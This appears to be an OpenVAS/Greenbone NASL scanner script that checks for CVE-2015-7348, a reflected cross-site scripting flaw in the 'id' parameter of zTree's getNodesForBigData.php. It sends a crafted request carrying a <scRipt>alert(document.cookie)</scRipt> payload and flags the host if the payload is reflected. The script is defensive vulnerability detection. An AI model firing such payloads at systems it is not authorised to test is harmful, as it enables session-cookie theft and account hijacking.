CPE = "cpe:/a:ztree_project:ztree";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.806901" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2015-12-16 11:04:52 +0530 (Wed, 16 Dec 2015)" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_name( "zTree Cross Site Scripting Vulnerability" );
	script_tag( name: "summary", value: "This host is installed with zTree
  and is prone to cross site scripting vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted request via HTTP GET and
  check whether it is able to read cookie or not." );
	script_tag( name: "insight", value: "The flaw exists due to an improper
  sanitization of 'id' parameter in getNodesForBigData.php script." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote
  attacker to execute arbitrary web script code in a user's browser session within
  the trust relationship between their browser and the server." );
	script_tag( name: "affected", value: "zTree version 3.5.19.1 and possibly below" );
	script_tag( name: "solution", value: "Upgrade to zTree 3.5.22 or later." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_xref( name: "URL", value: "https://www.netsparker.com/cve-2015-7348-multiple-xss-vulnerabilities-identified-in-ztree" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_ztree_detect.sc" );
	script_mandatory_keys( "zTree/Installed" );
	script_require_ports( "Services/www", 80 );
	script_xref( name: "URL", value: "https://github.com/zTree/zTree_v3" );
	exit( 0 );
}
require("http_func.inc.sc");
require("host_details.inc.sc");
require("http_keepalive.inc.sc");
if(!http_port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: http_port )){
	exit( 0 );
}
url = dir + "/en/asyncData/getNodesForBigData.php?id=\"\"<scRipt>alert(docu" + "ment.cookie)</scRipt>";
if(http_vuln_check( port: http_port, url: url, check_header: TRUE, pattern: "<scRipt>alert\\(document.cookie\\)</scRipt", extra_check: "name:'tree" )){
	report = http_report_vuln_url( port: http_port, url: url );
	security_message( port: http_port, data: report );
	exit( 0 );
}

